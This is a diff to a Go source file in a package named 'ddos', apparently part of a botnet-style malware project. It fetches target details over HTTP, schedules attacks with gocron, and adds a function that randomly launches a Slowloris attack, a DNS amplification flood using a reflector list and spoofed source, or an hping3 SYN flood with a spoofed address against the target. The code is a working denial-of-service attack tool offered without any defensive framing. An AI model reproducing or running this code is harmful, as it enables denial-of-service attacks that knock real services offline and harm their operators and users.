@@ -1,19 +1,24 @@
 package ddos
 
 import (
-    "fmt"
-    "net/http"
-    "encoding/json"
-    "sync"
-    "time"
-    "github.com/jasonlvhit/gocron"
+	"encoding/json"
+	"fmt"
+	"log"
+	"math/rand"
+	"net/http"
+	"os/exec"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/jasonlvhit/gocron"
 )
 
 type AttackInfo struct {
-    Ip       string
-    Port     string
-    Date     string
-    DateNs   int64
+	Ip     string
+	Port   string
+	Date   string
+	DateNs int64
 }
 
 // Hello returns a greeting for the named person.
@@ -33,7 +38,7 @@ func cronCheckDDoS() {
 	//scheduler.Every(1).Day().From(gocron.NextTick()).Do(checkDDoS)
 
 	// Start all the pending jobs
-	<- scheduler.Start()
+	<-scheduler.Start()
 }
 
 func checkDDoS() {
@@ -55,12 +60,44 @@ func cronAttackDDoS(ip string, date string, dateNs int64) {
 	scheduler.Every(1).Second().From(&t).Do(attackDDoS, ip)
 
 	fmt.Println(ip + " attack scheduled")
-	
-	<- scheduler.Start()
+
+	<-scheduler.Start()
 }
 
 func attackDDoS(ip string) {
-	fmt.Println(ip + " is being under attack!!!")
+	x := randomNumber()
+	fmt.Println(x)
+
+	switch x {
+	case 1:
+		fmt.Println("------------------------Starting Slowloris Attack------------------------")
+		out, err := exec.Command("/home/marti/Desktop/mlw/ddos/slowloris", ip).Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(string(out))
+	case 2:
+		fmt.Println("------------------------Starting DNS Amplification Attack------------------------")
+		out, err := exec.Command("/home/marti/Desktop/mlw/ddos/dnsdrdos.o", "-f", "/home/marti/Desktop/mlw/ddos/DNSlist.txt", "-s", strings.Split(ip, ":")[0], "-l", "10000000").Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(string(out))
+	case 3:
+		fmt.Println("------------------------Starting TCP SYN Attack------------------------")
+		out, err := exec.Command("hping3", "--syn", strings.Split(ip, ":")[0], "-p", "9999", "--flood", "--spoof", "10.0.0.1").Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(string(out))
+	}
+}
+
+func randomNumber() int {
+	rand.Seed(time.Now().UnixNano())
+	min := 1
+	max := 3
+	return rand.Intn(max-min+1) + min
 }
 
 func getAttackInfo(url string, target interface{}) error {
@@ -68,7 +105,7 @@ func getAttackInfo(url string, target interface{}) error {
 	if err != nil {
 		return err
 	}
-	
+
 	defer resp.Body.Close()
 	return json.NewDecoder(resp.Body).Decode(target)
 }
